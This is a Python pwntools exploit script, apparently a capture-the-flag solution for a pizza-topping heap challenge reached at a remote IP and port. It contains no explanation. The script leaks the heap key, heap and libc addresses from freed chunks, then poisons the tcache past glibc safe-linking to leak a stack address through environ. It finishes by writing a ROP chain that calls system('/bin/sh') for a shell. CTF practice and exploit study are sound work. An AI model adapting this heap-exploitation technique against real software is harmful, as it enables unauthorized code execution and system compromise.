```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process([exe.path])
p = remote('34.70.212.151', 8007)
def GDB():
    gdb.attach(p, gdbscript = '''
    b*customize_topping+280
    c
    ''')
    input()

toppings = [b"Tomato",b"Onion",b"Capsicum",b"Corn",b"Mushroom",b"Pineapple",b"Olives",b"Double",b"Paneer",b"Chicken"]

def add(idx, size):
    p.sendlineafter(b'choice : ', b'1')
    p.sendlineafter(b'topping ?\n', toppings[idx])
    p.sendlineafter(b'much ?\n', str(size))


def edit(idx, data):
    p.sendlineafter(b'choice : ', b'2')
    p.sendlineafter(b'customize ?\n', toppings[idx])
    p.sendlineafter(b'topping : ', data)

def delete(idx):
    p.sendlineafter(b'choice : ', b'3')
    p.sendlineafter(b'remove ?\n', toppings[idx])

def show(idx):
    p.sendlineafter(b'choice : ', b'4')
    p.sendlineafter(b'verify ?\n', toppings[idx])

for i in range(9):
    add(i,0x30)

for i in range(8):
    delete(i)
show(0)
key = u64(p.recv(5) + b'\0\0\0')
print(hex(key))
show(1)
heap = u64(p.recv(6) + b'\0\0') ^ key 
print(hex(heap))
show(7)
libc.address= u64(p.recv(6) + b'\0\0') - 0x219ce0
print(hex(libc.address))
environ = 0x221200 + libc.address
# delete(8)
for i in range(10):
    add(i,11)
for i in range(10):
    delete(i)
delete(8)
for i in range(8):
    add(i,11)
edit(7, p64(environ ^ (key + 1)))
add(1,11)
add(2,11)
add(3,11)
show(3)
stack = u64(p.recv(6) + b'\0\0') - 0x10 - 0x260 - 8 - 0x40 # read
print(hex(stack))
for i in range(10):
    add(i,14)
for i in range(10):
    delete(i)
delete(8)
for i in range(8):
    add(i,14)
# GDB()
edit(7, p64(stack ^ (key + 1)))
add(1,14)
add(2,14)
add(3,14)
pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])
edit(3 , p64(0)*9 + rop)
p.interactive()


```
